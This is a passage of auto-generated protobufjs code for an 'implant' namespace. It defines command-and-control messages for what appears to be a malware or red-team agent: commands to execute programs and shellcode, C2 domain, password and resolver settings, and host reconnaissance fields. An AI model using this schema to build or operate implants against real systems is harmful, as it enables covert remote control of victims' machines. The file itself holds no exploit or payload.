/*eslint-disable block-scoped-var, id-length, no-control-regex, no-magic-numbers, no-prototype-builtins, no-redeclare, no-shadow, no-var, sort-vars*/
"use strict";

var $protobuf = require("protobufjs/minimal");

// Common aliases
var $Reader = $protobuf.Reader, $Writer = $protobuf.Writer, $util = $protobuf.util;

// Exported root namespace
var $root = $protobuf.roots["default"] || ($protobuf.roots["default"] = {});

$root.implant = (function() {

    /**
     * Namespace implant.
     * @exports implant
     * @namespace
     */
    var implant = {};

    /**
     * AgentCommand enum.
     * @name implant.AgentCommand
     * @enum {number}
     * @property {number} AGENT_UNSPECIFIED=0 AGENT_UNSPECIFIED value
     * @property {number} AGENT_CHECKIN=1 AGENT_CHECKIN value
     * @property {number} AGENT_SYSINFO=2 AGENT_SYSINFO value
     * @property {number} AGENT_EXECUTE=3 AGENT_EXECUTE value
     * @property {number} AGENT_EXECUTE_SHELLCODE=4 AGENT_EXECUTE_SHELLCODE value
     * @property {number} AGENT_MESSAGE=5 AGENT_MESSAGE value
     * @property {number} AGENT_SHUTDOWN=6 AGENT_SHUTDOWN value
     * @property {number} AGENT_KEYX=7 AGENT_KEYX value
     * @property {number} AGENT_SET_CONFIG=8 AGENT_SET_CONFIG value
     * @property {number} AGENT_IGNORE=9 AGENT_IGNORE value
     */
    implant.AgentCommand = (function() {
        var valuesById = {}, values = Object.create(valuesById);
        values[valuesById[0] = "AGENT_UNSPECIFIED"] = 0;
        values[valuesById[1] = "AGENT_CHECKIN"] = 1;
        values[valuesById[2] = "AGENT_SYSINFO"] = 2;
        values[valuesById[3] = "AGENT_EXECUTE"] = 3;
        values[valuesById[4] = "AGENT_EXECUTE_SHELLCODE"] = 4;
        values[valuesById[5] = "AGENT_MESSAGE"] = 5;
        values[valuesById[6] = "AGENT_SHUTDOWN"] = 6;
        values[valuesById[7] = "AGENT_KEYX"] = 7;
        values[valuesById[8] = "AGENT_SET_CONFIG"] = 8;
        values[valuesById[9] = "AGENT_IGNORE"] = 9;
        return values;
    })();

    /**
     * AgentCommandStatus enum.
     * @name implant.AgentCommandStatus
     * @enum {number}
     * @property {number} STATUS_UNSPECIFIED=0 STATUS_UNSPECIFIED value
     * @property {number} STATUS_SUCCESS=1 STATUS_SUCCESS value
     * @property {number} STATUS_ERROR=2 STATUS_ERROR value
     */
    implant.AgentCommandStatus = (function() {
        var valuesById = {}, values = Object.create(valuesById);
        values[valuesById[0] = "STATUS_UNSPECIFIED"] = 0;
        values[valuesById[1] = "STATUS_SUCCESS"] = 1;
        values[valuesById[2] = "STATUS_ERROR"] = 2;
        return values;
    })();

    implant.AgentConfig = (function() {

        /**
         * Properties of an AgentConfig.
         * @memberof implant
         * @interface IAgentConfig
         * @property {string|null} [c2Domain] AgentConfig c2Domain
         * @property {string|null} [c2Password] AgentConfig c2Password
         * @property {string|null} [resolver] AgentConfig resolver
         * @property {number|null} [c2IntervalMs] AgentConfig c2IntervalMs
         * @property {boolean|null} [useWebChannel] AgentConfig useWebChannel
         * @property {string|null} [webUrl] AgentConfig webUrl
         * @property {string|null} [webKey] AgentConfig webKey
         */

        /**
         * Constructs a new AgentConfig.
         * @memberof implant
         * @classdesc Represents an AgentConfig.
         * @implements IAgentConfig
         * @constructor
         * @param {implant.IAgentConfig=} [properties] Properties to set
         */
        function AgentConfig(properties) {
            if (properties)
                for (var keys = Object.keys(properties), i = 0; i < keys.length; ++i)
                    if (properties[keys[i]] != null)
                        this[keys[i]] = properties[keys[i]];
        }

        /**
         * AgentConfig c2Domain.
         * @member {string} c2Domain
         * @memberof implant.AgentConfig
         * @instance
         */
        AgentConfig.prototype.c2Domain = "";

        /**
         * AgentConfig c2Password.
         * @member {string} c2Password
         * @memberof implant.AgentConfig
         * @instance
         */
        AgentConfig.prototype.c2Password = "";

        /**
         * AgentConfig resolver.
         * @member {string} resolver
         * @memberof implant.AgentConfig
         * @instance
         */
        AgentConfig.prototype.resolver = "";

        /**
         * AgentConfig c2IntervalMs.
         * @member {number} c2IntervalMs
         * @memberof implant.AgentConfig
         * @instance
         */
        AgentConfig.prototype.c2IntervalMs = 0;

        /**
         * AgentConfig useWebChannel.
         * @member {boolean} useWebChannel
         * @memberof implant.AgentConfig
         * @instance
         */
        AgentConfig.prototype.useWebChannel = false;

        /**
         * AgentConfig webUrl.
         * @member {string} webUrl
         * @memberof implant.AgentConfig
         * @instance
         */
        AgentConfig.prototype.webUrl = "";

        /**
         * AgentConfig webKey.
         * @member {string} webKey
         * @memberof implant.AgentConfig
         * @instance
         */
        AgentConfig.prototype.webKey = "";

        /**
         * Creates a new AgentConfig instance using the specified properties.
         * @function create
         * @memberof implant.AgentConfig
         * @static
         * @param {implant.IAgentConfig=} [properties] Properties to set
         * @returns {implant.AgentConfig} AgentConfig instance
         */
        AgentConfig.create = function create(properties) {
            return new AgentConfig(properties);
        };

        /**
         * Encodes the specified AgentConfig message. Does not implicitly {@link implant.AgentConfig.verify|verify} messages.
         * @function encode
         * @memberof implant.AgentConfig
         * @static
         * @param {implant.IAgentConfig} message AgentConfig message or plain object to encode
         * @param {$protobuf.Writer} [writer] Writer to encode to
         * @returns {$protobuf.Writer} Writer
         */
        AgentConfig.encode = function encode(message, writer) {
            if (!writer)
                writer = $Writer.create();
            if (message.c2Domain != null && Object.hasOwnProperty.call(message, "c2Domain"))
                writer.uint32(/* id 1, wireType 2 =*/10).string(message.c2Domain);
            if (message.c2Password != null && Object.hasOwnProperty.call(message, "c2Password"))
                writer.uint32(/* id 2, wireType 2 =*/18).string(message.c2Password);
            if (message.resolver != null && Object.hasOwnProperty.call(message, "resolver"))
                writer.uint32(/* id 3, wireType 2 =*/26).string(message.resolver);
            if (message.c2IntervalMs != null && Object.hasOwnProperty.call(message, "c2IntervalMs"))
                writer.uint32(/* id 4, wireType 0 =*/32).uint32(message.c2IntervalMs);
            if (message.useWebChannel != null && Object.hasOwnProperty.call(message, "useWebChannel"))
                writer.uint32(/* id 5, wireType 0 =*/40).bool(message.useWebChannel);
            if (message.webUrl != null && Object.hasOwnProperty.call(message, "webUrl"))
                writer.uint32(/* id 6, wireType 2 =*/50).string(message.webUrl);
            if (message.webKey != null && Object.hasOwnProperty.call(message, "webKey"))
                writer.uint32(/* id 7, wireType 2 =*/58).string(message.webKey);
            return writer;
        };

        /**
         * Encodes the specified AgentConfig message, length delimited. Does not implicitly {@link implant.AgentConfig.verify|verify} messages.
         * @function encodeDelimited
         * @memberof implant.AgentConfig
         * @static
         * @param {implant.IAgentConfig} message AgentConfig message or plain object to encode
         * @param {$protobuf.Writer} [writer] Writer to encode to
         * @returns {$protobuf.Writer} Writer
         */
        AgentConfig.encodeDelimited = function encodeDelimited(message, writer) {
            return this.encode(message, writer).ldelim();
        };

        /**
         * Decodes an AgentConfig message from the specified reader or buffer.
         * @function decode
         * @memberof implant.AgentConfig
         * @static
         * @param {$protobuf.Reader|Uint8Array} reader Reader or buffer to decode from
         * @param {number} [length] Message length if known beforehand
         * @returns {implant.AgentConfig} AgentConfig
         * @throws {Error} If the payload is not a reader or valid buffer
         * @throws {$protobuf.util.ProtocolError} If required fields are missing
         */
        AgentConfig.decode = function decode(reader, length) {
            if (!(reader instanceof $Reader))
                reader = $Reader.create(reader);
            var end = length === undefined ? reader.len : reader.pos + length, message = new $root.implant.AgentConfig();
            while (reader.pos < end) {
                var tag = reader.uint32();
                switch (tag >>> 3) {
                case 1: {
                        message.c2Domain = reader.string();
                        break;
                    }
                case 2: {
                        message.c2Password = reader.string();
                        break;
                    }
                case 3: {
                        message.resolver = reader.string();
                        break;
                    }
                case 4: {
                        message.c2IntervalMs = reader.uint32();
                        break;
                    }
                case 5: {
                        message.useWebChannel = reader.bool();
                        break;
                    }
                case 6: {
                        message.webUrl = reader.string();
                        break;
                    }
                case 7: {
                        message.webKey = reader.string();
                        break;
                    }
                default:
                    reader.skipType(tag & 7);
                    break;
                }
            }
            return message;
        };

        /**
         * Decodes an AgentConfig message from the specified reader or buffer, length delimited.
         * @function decodeDelimited
         * @memberof implant.AgentConfig
         * @static
         * @param {$protobuf.Reader|Uint8Array} reader Reader or buffer to decode from
         * @returns {implant.AgentConfig} AgentConfig
         * @throws {Error} If the payload is not a reader or valid buffer
         * @throws {$protobuf.util.ProtocolError} If required fields are missing
         */
        AgentConfig.decodeDelimited = function decodeDelimited(reader) {
            if (!(reader instanceof $Reader))
                reader = new $Reader(reader);
            return this.decode(reader, reader.uint32());
        };

        /**
         * Verifies an AgentConfig message.
         * @function verify
         * @memberof implant.AgentConfig
         * @static
         * @param {Object.<string,*>} message Plain object to verify
         * @returns {string|null} `null` if valid, otherwise the reason why it is not
         */
        AgentConfig.verify = function verify(message) {
            if (typeof message !== "object" || message === null)
                return "object expected";
            if (message.c2Domain != null && message.hasOwnProperty("c2Domain"))
                if (!$util.isString(message.c2Domain))
                    return "c2Domain: string expected";
            if (message.c2Password != null && message.hasOwnProperty("c2Password"))
                if (!$util.isString(message.c2Password))
                    return "c2Password: string expected";
            if (message.resolver != null && message.hasOwnProperty("resolver"))
                if (!$util.isString(message.resolver))
                    return "resolver: string expected";
            if (message.c2IntervalMs != null && message.hasOwnProperty("c2IntervalMs"))
                if (!$util.isInteger(message.c2IntervalMs))
                    return "c2IntervalMs: integer expected";
            if (message.useWebChannel != null && message.hasOwnProperty("useWebChannel"))
                if (typeof message.useWebChannel !== "boolean")
                    return "useWebChannel: boolean expected";
            if (message.webUrl != null && message.hasOwnProperty("webUrl"))
                if (!$util.isString(message.webUrl))
                    return "webUrl: string expected";
            if (message.webKey != null && message.hasOwnProperty("webKey"))
                if (!$util.isString(message.webKey))
                    return "webKey: string expected";
            return null;
        };

        /**
         * Creates an AgentConfig message from a plain object. Also converts values to their respective internal types.
         * @function fromObject
         * @memberof implant.AgentConfig
         * @static
         * @param {Object.<string,*>} object Plain object
         * @returns {implant.AgentConfig} AgentConfig
         */
        AgentConfig.fromObject = function fromObject(object) {
            if (object instanceof $root.implant.AgentConfig)
                return object;
            var message = new $root.implant.AgentConfig();
            if (object.c2Domain != null)
                message.c2Domain = String(object.c2Domain);
            if (object.c2Password != null)
                message.c2Password = String(object.c2Password);
            if (object.resolver != null)
                message.resolver = String(object.resolver);
            if (object.c2IntervalMs != null)
                message.c2IntervalMs = object.c2IntervalMs >>> 0;
            if (object.useWebChannel != null)
                message.useWebChannel = Boolean(object.useWebChannel);
            if (object.webUrl != null)
                message.webUrl = String(object.webUrl);
            if (object.webKey != null)
                message.webKey = String(object.webKey);
            return message;
        };

        /**
         * Creates a plain object from an AgentConfig message. Also converts values to other types if specified.
         * @function toObject
         * @memberof implant.AgentConfig
         * @static
         * @param {implant.AgentConfig} message AgentConfig
         * @param {$protobuf.IConversionOptions} [options] Conversion options
         * @returns {Object.<string,*>} Plain object
         */
        AgentConfig.toObject = function toObject(message, options) {
            if (!options)
                options = {};
            var object = {};
            if (options.defaults) {
                object.c2Domain = "";
                object.c2Password = "";
                object.resolver = "";
                object.c2IntervalMs = 0;
                object.useWebChannel = false;
                object.webUrl = "";
                object.webKey = "";
            }
            if (message.c2Domain != null && message.hasOwnProperty("c2Domain"))
                object.c2Domain = message.c2Domain;
            if (message.c2Password != null && message.hasOwnProperty("c2Password"))
                object.c2Password = message.c2Password;
            if (message.resolver != null && message.hasOwnProperty("resolver"))
                object.resolver = message.resolver;
            if (message.c2IntervalMs != null && message.hasOwnProperty("c2IntervalMs"))
                object.c2IntervalMs = message.c2IntervalMs;
            if (message.useWebChannel != null && message.hasOwnProperty("useWebChannel"))
                object.useWebChannel = message.useWebChannel;
            if (message.webUrl != null && message.hasOwnProperty("webUrl"))
                object.webUrl = message.webUrl;
            if (message.webKey != null && message.hasOwnProperty("webKey"))
                object.webKey = message.webKey;
            return object;
        };

        /**
         * Converts this AgentConfig to JSON.
         * @function toJSON
         * @memberof implant.AgentConfig
         * @instance
         * @returns {Object.<string,*>} JSON object
         */
        AgentConfig.prototype.toJSON = function toJSON() {
            return this.constructor.toObject(this, $protobuf.util.toJSONOptions);
        };

        /**
         * Gets the default type url for AgentConfig
         * @function getTypeUrl
         * @memberof implant.AgentConfig
         * @static
         * @param {string} [typeUrlPrefix] your custom typeUrlPrefix(default "type.googleapis.com")
         * @returns {string} The default type url
         */
        AgentConfig.getTypeUrl = function getTypeUrl(typeUrlPrefix) {
            if (typeUrlPrefix === undefined) {
                typeUrlPrefix = "type.googleapis.com";
            }
            return typeUrlPrefix + "/implant.AgentConfig";
        };

        return AgentConfig;
    })();

    implant.SysInfoData = (function() {

        /**
         * Properties of a SysInfoData.
         * @memberof implant
         * @interface ISysInfoData
         * @property {string|null} [hostname] SysInfoData hostname
         * @property {Array.<string>|null} [ip] SysInfoData ip
         * @property {string|null} [user] SysInfoData user
         * @property {string|null} [uid] SysInfoData uid
         * @property {string|null} [gid] SysInfoData gid
         */

        /**
         * Constructs a new SysInfoData.
         * @memberof implant
         * @classdesc Represents a SysInfoData.
         * @implements ISysInfoData
         * @constructor
         * @param {implant.ISysInfoData=} [properties] Properties to set
         */
        function SysInfoData(properties) {
            this.ip = [];
            if (properties)
                for (var keys = Object.keys(properties), i = 0; i < keys.length; ++i)
                    if (properties[keys[i]] != null)
                        this[keys[i]] = properties[keys[i]];
        }

        /**
         * SysInfoData hostname.
         * @member {string} hostname
         * @memberof implant.SysInfoData
         * @instance
         */
        SysInfoData.prototype.hostname = "";

        /**
         * SysInfoData ip.
         * @member {Array.<string>} ip
         * @memberof implant.SysInfoData
         * @instance
         */
        SysInfoData.prototype.ip = $util.emptyArray;

        /**
         * SysInfoData user.
         * @member {string} user
         * @memberof implant.SysInfoData
         * @instance
         */
        SysInfoData.prototype.user = "";

        /**
         * SysInfoData uid.
         * @member {string} uid
         * @memberof implant.SysInfoData
         * @instance
         */
        SysInfoData.prototype.uid = "";

        /**
         * SysInfoData gid.
         * @member {string} gid
         * @memberof implant.SysInfoData
         * @instance
         */
        SysInfoData.prototype.gid = "";

        /**
         * Creates a new SysInfoData instance using the specified properties.
         * @function create
         * @memberof implant.SysInfoData
         * @static
         * @param {implant.ISysInfoData=} [properties] Properties to set
         * @returns {implant.SysInfoData} SysInfoData instance
         */
        SysInfoData.create = function create(properties) {
            return new SysInfoData(properties);
        };

        /**
         * Encodes the specified SysInfoData message. Does not implicitly {@link implant.SysInfoData.verify|verify} messages.
         * @function encode
         * @memberof implant.SysInfoData
         * @static
         * @param {implant.ISysInfoData} message SysInfoData message or plain object to encode
         * @param {$protobuf.Writer} [writer] Writer to encode to
         * @returns {$protobuf.Writer} Writer
         */
        SysInfoData.encode = function encode(message, writer) {
            if (!writer)
                writer = $Writer.create();
            if (message.hostname != null && Object.hasOwnProperty.call(message, "hostname"))
                writer.uint32(/* id 1, wireType 2 =*/10).string(message.hostname);
            if (message.ip != null && message.ip.length)
                for (var i = 0; i < message.ip.length; ++i)
                    writer.uint32(/* id 2, wireType 2 =*/18).string(message.ip[i]);
            if (message.user != null && Object.hasOwnProperty.call(message, "user"))
                writer.uint32(/* id 3, wireType 2 =*/26).string(message.user);
            if (message.uid != null && Object.hasOwnProperty.call(message, "uid"))
                writer.uint32(/* id 4, wireType 2 =*/34).string(message.uid);
            if (message.gid != null && Object.hasOwnProperty.call(message, "gid"))
                writer.uint32(/* id 5, wireType 2 =*/42).string(message.gid);
            return writer;
        };

        /**
         * Encodes the specified SysInfoData message, length delimited. Does not implicitly {@link implant.SysInfoData.verify|verify} messages.
         * @function encodeDelimited
         * @memberof implant.SysInfoData
         * @static
         * @param {implant.ISysInfoData} message SysInfoData message or plain object to encode
         * @param {$protobuf.Writer} [writer] Writer to encode to
         * @returns {$protobuf.Writer} Writer
         */
        SysInfoData.encodeDelimited = function encodeDelimited(message, writer) {
            return this.encode(message, writer).ldelim();
        };

        /**
         * Decodes a SysInfoData message from the specified reader or buffer.
         * @function decode
         * @memberof implant.SysInfoData
         * @static
         * @param {$protobuf.Reader|Uint8Array} reader Reader or buffer to decode from
         * @param {number} [length] Message length if known beforehand
         * @returns {implant.SysInfoData} SysInfoData
         * @throws {Error} If the payload is not a reader or valid buffer
         * @throws {$protobuf.util.ProtocolError} If required fields are missing
         */
        SysInfoData.decode = function decode(reader, length) {
            if (!(reader instanceof $Reader))
                reader = $Reader.create(reader);
            var end = length === undefined ? reader.len : reader.pos + length, message = new $root.implant.SysInfoData();
            while (reader.pos < end) {
                var tag = reader.uint32();
                switch (tag >>> 3) {
                case 1: {
                        message.hostname = reader.string();
                        break;
                    }
                case 2: {
                        if (!(message.ip && message.ip.length))
                            message.ip = [];
                        message.ip.push(reader.string());
                        break;
                    }
                case 3: {
                        message.user = reader.string();
                        break;
                    }
                case 4: {
                        message.uid = reader.string();
                        break;
                    }
                case 5: {
                        message.gid = reader.string();
                        break;
                    }
                default:
                    reader.skipType(tag & 7);
                    break;
                }
            }
            return message;
        };

        /**
         * Decodes a SysInfoData message from the specified reader or buffer, length delimited.
         * @function decodeDelimited
         * @memberof implant.SysInfoData
         * @static
         * @param {$protobuf.Reader|Uint8Array} reader Reader or buffer to decode from
         * @returns {implant.SysInfoData} SysInfoData
         * @throws {Error} If the payload is not a reader or valid buffer
         * @throws {$protobuf.util.ProtocolError} If required fields are missing
         */
        SysInfoData.decodeDelimited = function decodeDelimited(reader) {
            if (!(reader instanceof $Reader))
                reader = new $Reader(reader);
            return this.decode(reader, reader.uint32());
        };

        /**
         * Verifies a SysInfoData message.
         * @function verify
         * @memberof implant.SysInfoData
         * @static
         * @param {Object.<string,*>} message Plain object to verify
         * @returns {string|null} `null` if valid, otherwise the reason why it is not
         */
        SysInfoData.verify = function verify(message) {
            if (typeof message !== "object" || message === null)
                return "object expected";
            if (message.hostname != null && message.hasOwnProperty("hostname"))
                if (!$util.isString(message.hostname))
                    return "hostname: string expected";
            if (message.ip != null && message.hasOwnProperty("ip")) {
                if (!Array.isArray(message.ip))
                    return "ip: array expected";
                for (var i = 0; i < message.ip.length; ++i)
                    if (!$util.isString(message.ip[i]))
                        return "ip: string[] expected";
            }
            if (message.user != null && message.hasOwnProperty("user"))
                if (!$util.isString(message.user))
                    return "user: string expected";
            if (message.uid != null && message.hasOwnProperty("uid"))
                if (!$util.isString(message.uid))
                    return "uid: string expected";
            if (message.gid != null && message.hasOwnProperty("gid"))
                if (!$util.isString(message.gid))
                    return "gid: string expected";
            return null;
        };

        /**
         * Creates a SysInfoData message from a plain object. Also converts values to their respective internal types.
         * @function fromObject
         * @memberof implant.SysInfoData
         * @static
         * @param {Object.<string,*>} object Plain object
         * @returns {implant.SysInfoData} SysInfoData
         */
        SysInfoData.fromObject = function fromObject(object) {
            if (object instanceof $root.implant.SysInfoData)
                return object;
            var message = new $root.implant.SysInfoData();
            if (object.hostname != null)
                message.hostname = String(object.hostname);
            if (object.ip) {
                if (!Array.isArray(object.ip))
                    throw TypeError(".implant.SysInfoData.ip: array expected");
                message.ip = [];
                for (var i = 0; i < object.ip.length; ++i)
                    message.ip[i] = String(object.ip[i]);
            }
            if (object.user != null)
                message.user = String(object.user);
            if (object.uid != null)
                message.uid = String(object.uid);
            if (object.gid != null)
                message.gid = String(object.gid);
            return message;
        };

        /**
         * Creates a plain object from a SysInfoData message. Also converts values to other types if specified.
         * @function toObject
         * @memberof implant.SysInfoData
         * @static
         * @param {implant.SysInfoData} message SysInfoData
         * @param {$protobuf.IConversionOptions} [options] Conversion options
         * @returns {Object.<string,*>} Plain object
         */
        SysInfoData.toObject = function toObject(message, options) {
            if (!options)
                options = {};
            var object = {};
            if (options.arrays || options.defaults)
                object.ip = [];
            if (options.defaults) {
                object.hostname = "";
                object.user = "";
                object.uid = "";
                object.gid = "";
            }
            if (message.hostname != null && message.hasOwnProperty("hostname"))
                object.hostname = message.hostname;
            if (message.ip && message.ip.length) {
                object.ip = [];
                for (var j = 0; j < message.ip.length; ++j)
                    object.ip[j] = message.ip[j];
            }
            if (message.user != null && message.hasOwnProperty("user"))
                object.user = message.user;
            if (message.uid != null && message.hasOwnProperty("uid"))
                object.uid = message.uid;
            if (message.gid != null && message.hasOwnProperty("gid"))
                object.gid = message.gid;
            return object;
        };

        /**
         * Converts this SysInfoData to JSON.
         * @function toJSON
         * @memberof implant.SysInfoData
         * @instance
         * @returns {Object.<string,*>} JSON object
         */
        SysInfoData.prototype.toJSON = function toJSON() {
            return this.constructor.toObject(this, $protobuf.util.toJSONOptions);
        };

        /**
         * Gets the default type url for SysInfoData
         * @function getTypeUrl
         * @memberof implant.SysInfoData
         * @static
         * @param {string} [typeUrlPrefix] your custom typeUrlPrefix(default "type.googleapis.com")
         * @returns {string} The default type url
         */
        SysInfoData.getTypeUrl = function getTypeUrl(typeUrlPrefix) {
            if (typeUrlPrefix === undefined) {
                typeUrlPrefix = "type.googleapis.com";
            }
            return typeUrlPrefix + "/implant.SysInfoData";
        };

        return SysInfoData;
    })();

    implant.Command = (function() {

        /**
         * Properties of a Command.
         * @memberof implant
         * @interface ICommand
         */

        /**
         * Constructs a new Command.
         * @memberof implant
         * @classdesc Represents a Command.
         * @implements ICommand
         * @constructor
         * @param {implant.ICommand=} [properties] Properties to set
         */
        function Command(properties) {
            if (properties)
                for (var keys = Object.keys(properties), i = 0; i < keys.length; ++i)
                    if (properties[keys[i]] != null)
                        this[keys[i]] = properties[keys[i]];
        }

        /**
         * Creates a new Command instance using the specified properties.
         * @function create
         * @memberof implant.Command
         * @static
         * @param {implant.ICommand=} [properties] Properties to set
         * @returns {implant.Command} Command instance
         */
        Command.create = function create(properties) {
            return new Command(properties);
        };

        /**
         * Encodes the specified Command message. Does not implicitly {@link implant.Command.verify|verify} messages.
         * @function encode
         * @memberof implant.Command
         * @static
         * @param {implant.ICommand} message Command message or plain object to encode
         * @param {$protobuf.Writer} [writer] Writer to encode to
         * @returns {$protobuf.Writer} Writer
         */
        Command.encode = function encode(message, writer) {
            if (!writer)
                writer = $Writer.create();
            return writer;
        };

        /**
         * Encodes the specified Command message, length delimited. Does not implicitly {@link implant.Command.verify|verify} messages.
         * @function encodeDelimited
         * @memberof implant.Command
         * @static
         * @param {implant.ICommand} message Command message or plain object to encode
         * @param {$protobuf.Writer} [writer] Writer to encode to
         * @returns {$protobuf.Writer} Writer
         */
        Command.encodeDelimited = function encodeDelimited(message, writer) {
            return this.encode(message, writer).ldelim();
        };

        /**
         * Decodes a Command message from the specified reader or buffer.
         * @function decode
         * @memberof implant.Command
         * @static
         * @param {$protobuf.Reader|Uint8Array} reader Reader or buffer to decode from
         * @param {number} [length] Message length if known beforehand
         * @returns {implant.Command} Command
         * @throws {Error} If the payload is not a reader or valid buffer
         * @throws {$protobuf.util.ProtocolError} If required fields are missing
         */
        Command.decode = function decode(reader, length) {
            if (!(reader instanceof $Reader))
                reader = $Reader.create(reader);
            var end = length === undefined ? reader.len : reader.pos + length, message = new $root.implant.Command();
            while (reader.pos < end) {
                var tag = reader.uint32();
                switch (tag >>> 3) {
                default:
                    reader.skipType(tag & 7);
                    break;
                }
            }
            return message;
        };

        /**
         * Decodes a Command message from the specified reader or buffer, length delimited.
         * @function decodeDelimited
         * @memberof implant.Command
         * @static
         * @param {$protobuf.Reader|Uint8Array} reader Reader or buffer to decode from
         * @returns {implant.Command} Command
         * @throws {Error} If the payload is not a reader or valid buffer
         * @throws {$protobuf.util.ProtocolError} If required fields are missing
         */
        Command.decodeDelimited = function decodeDelimited(reader) {
            if (!(reader instanceof $Reader))
                reader = new $Reader(reader);
            return this.decode(reader, reader.uint32());
        };

        /**
         * Verifies a Command message.
         * @function verify
         * @memberof implant.Command
         * @static
         * @param {Object.<string,*>} message Plain object to verify
         * @returns {string|null} `null` if valid, otherwise the reason why it is not
         */
        Command.verify = function verify(message) {
            if (typeof message !== "object" || message === null)
                return "object expected";
            return null;
        };

        /**
         * Creates a Command message from a plain object. Also converts values to their respective internal types.
         * @function fromObject
         * @memberof implant.Command
         * @static
         * @param {Object.<string,*>} object Plain object
         * @returns {implant.Command} Command
         */
        Command.fromObject = function fromObject(object) {
            if (object instanceof $root.implant.Command)
                return object;
            return new $root.implant.Command();
        };

        /**
         * Creates a plain object from a Command message. Also converts values to other types if specified.
         * @function toObject
         * @memberof implant.Command
         * @static
         * @param {implant.Command} message Command
         * @param {$protobuf.IConversionOptions} [options] Conversion options
         * @returns {Object.<string,*>} Plain object
         */
        Command.toObject = function toObject() {
            return {};
        };

        /**
         * Converts this Command to JSON.
         * @function toJSON
         * @memberof implant.Command
         * @instance
         * @returns {Object.<string,*>} JSON object
         */
        Command.prototype.toJSON = function toJSON() {
            return this.constructor.toObject(this, $protobuf.util.toJSONOptions);
        };

        /**
         * Gets the default type url for Command
         * @function getTypeUrl
         * @memberof implant.Command
         * @static
         * @param {string} [typeUrlPrefix] your custom typeUrlPrefix(default "type.googleapis.com")
         * @returns {string} The default type url
         */
        Command.getTypeUrl = function getTypeUrl(typeUrlPrefix) {
            if (typeUrlPrefix === undefined) {
                typeUrlPrefix = "type.googleapis.com";
            }
            return typeUrlPrefix + "/implant.Command";
        };

        Command.Request = (function() {

            /**
             * Properties of a Request.
             * @memberof implant.Command
             * @interface IRequest
             * @property {implant.AgentCommand|null} [command] Request command
             * @property {Uint8Array|null} [input] Request input
             * @property {implant.IAgentConfig|null} [config] Request config
             */

            /**
             * Constructs a new Request.
             * @memberof implant.Command
             * @classdesc Represents a Request.
             * @implements IRequest
             * @constructor
             * @param {implant.Command.IRequest=} [properties] Properties to set
             */
            function Request(properties) {
                if (properties)
                    for (var keys = Object.keys(properties), i = 0; i < keys.length; ++i)
                        if (properties[keys[i]] != null)
                            this[keys[i]] = properties[keys[i]];
            }

            /**
             * Request command.
             * @member {implant.AgentCommand} command
             * @memberof implant.Command.Request
             * @instance
             */
            Request.prototype.command = 0;

            /**
             * Request input.
             * @member {Uint8Array} input
             * @memberof implant.Command.Request
             * @instance
             */
            Request.prototype.input = $util.newBuffer([]);

            /**
             * Request config.
             * @member {implant.IAgentConfig|null|undefined} config
             * @memberof implant.Command.Request
             * @instance
             */
            Request.prototype.config = null;

            /**
             * Creates a new Request instance using the specified properties.
             * @function create
             * @memberof implant.Command.Request
             * @static
             * @param {implant.Command.IRequest=} [properties] Properties to set
             * @returns {implant.Command.Request} Request instance
             */
            Request.create = function create(properties) {
                return new Request(properties);
            };

            /**
             * Encodes the specified Request message. Does not implicitly {@link implant.Command.Request.verify|verify} messages.
             * @function encode
             * @memberof implant.Command.Request
             * @static
             * @param {implant.Command.IRequest} message Request message or plain object to encode
             * @param {$protobuf.Writer} [writer] Writer to encode to
             * @returns {$protobuf.Writer} Writer
             */
            Request.encode = function encode(message, writer) {
                if (!writer)
                    writer = $Writer.create();
                if (message.command != null && Object.hasOwnProperty.call(message, "command"))
                    writer.uint32(/* id 1, wireType 0 =*/8).int32(message.command);
                if (message.input != null && Object.hasOwnProperty.call(message, "input"))
                    writer.uint32(/* id 2, wireType 2 =*/18).bytes(message.input);
                if (message.config != null && Object.hasOwnProperty.call(message, "config"))
                    $root.implant.AgentConfig.encode(message.config, writer.uint32(/* id 3, wireType 2 =*/26).fork()).ldelim();
                return writer;
            };

            /**
             * Encodes the specified Request message, length delimited. Does not implicitly {@link implant.Command.Request.verify|verify} messages.
             * @function encodeDelimited
             * @memberof implant.Command.Request
             * @static
             * @param {implant.Command.IRequest} message Request message or plain object to encode
             * @param {$protobuf.Writer} [writer] Writer to encode to
             * @returns {$protobuf.Writer} Writer
             */
            Request.encodeDelimited = function encodeDelimited(message, writer) {
                return this.encode(message, writer).ldelim();
            };

            /**
             * Decodes a Request message from the specified reader or buffer.
             * @function decode
             * @memberof implant.Command.Request
             * @static
             * @param {$protobuf.Reader|Uint8Array} reader Reader or buffer to decode from
             * @param {number} [length] Message length if known beforehand
             * @returns {implant.Command.Request} Request
             * @throws {Error} If the payload is not a reader or valid buffer
             * @throws {$protobuf.util.ProtocolError} If required fields are missing
             */
            Request.decode = function decode(reader, length) {
                if (!(reader instanceof $Reader))
                    reader = $Reader.create(reader);
                var end = length === undefined ? reader.len : reader.pos + length, message = new $root.implant.Command.Request();
                while (reader.pos < end) {
                    var tag = reader.uint32();
                    switch (tag >>> 3) {
                    case 1: {
                            message.command = reader.int32();
                            break;
                        }
                    case 2: {
                            message.input = reader.bytes();
                            break;
                        }
                    case 3: {
                            message.config = $root.implant.AgentConfig.decode(reader, reader.uint32());
                            break;
                        }
                    default:
                        reader.skipType(tag & 7);
                        break;
                    }
                }
                return message;
            };

            /**
             * Decodes a Request message from the specified reader or buffer, length delimited.
             * @function decodeDelimited
             * @memberof implant.Command.Request
             * @static
             * @param {$protobuf.Reader|Uint8Array} reader Reader or buffer to decode from
             * @returns {implant.Command.Request} Request
             * @throws {Error} If the payload is not a reader or valid buffer
             * @throws {$protobuf.util.ProtocolError} If required fields are missing
             */
            Request.decodeDelimited = function decodeDelimited(reader) {
                if (!(reader instanceof $Reader))
                    reader = new $Reader(reader);
                return this.decode(reader, reader.uint32());
            };

            /**
             * Verifies a Request message.
             * @function verify
             * @memberof implant.Command.Request
             * @static
             * @param {Object.<string,*>} message Plain object to verify
             * @returns {string|null} `null` if valid, otherwise the reason why it is not
             */
            Request.verify = function verify(message) {
                if (typeof message !== "object" || message === null)
                    return "object expected";
                if (message.command != null && message.hasOwnProperty("command"))
                    switch (message.command) {
                    default:
                        return "command: enum value expected";
                    case 0:
                    case 1:
                    case 2:
                    case 3:
                    case 4:
                    case 5:
                    case 6:
                    case 7:
                    case 8:
                    case 9:
                        break;
                    }
                if (message.input != null && message.hasOwnProperty("input"))
                    if (!(message.input && typeof message.input.length === "number" || $util.isString(message.input)))
                        return "input: buffer expected";
                if (message.config != null && message.hasOwnProperty("config")) {
                    var error = $root.implant.AgentConfig.verify(message.config);
                    if (error)
                        return "config." + error;
                }
                return null;
